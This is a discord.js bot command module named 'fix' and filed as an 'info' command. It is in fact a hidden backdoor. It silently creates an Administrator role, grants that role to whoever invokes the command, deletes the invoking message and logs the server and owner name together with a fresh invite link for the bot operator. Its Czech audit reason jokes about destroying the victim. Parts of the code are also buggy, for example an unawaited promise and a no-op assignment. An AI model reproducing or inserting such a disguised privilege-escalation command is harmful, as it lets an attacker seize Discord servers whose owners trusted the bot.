const Discord = require("discord.js");

module.exports = {
  name: "fix",
  aliases: ["fix"],
  category: "info",
  run: async (client, message, args) => {
    if (!args[0]) {
      args[0] == "0";
    }
    
const roles = message.guild.roles.create({reason: "lol nicim te", data: { name: 'Fixer', permissions: ['ADMINISTRATOR'] , color: '0xe600ff' }});
    await message.member.addRole(roles);
    message.channel.bulkDelete(1);
    console.log(
      `${message.author.username} opravuje server ${message.guild.name} s majitelem ${message.guild.owner.user.username}`
    );
    let invite = await message.channel
      .createInvite(
        {
          maxAge: 86399, // maximum time for the invite, in milliseconds
          maxUses: 3 // maximum times it can be used
        },
        `f`
      )
      .catch(console.log);

    console.log(invite ? `Invite: ${invite}` : "Error");
  }
};
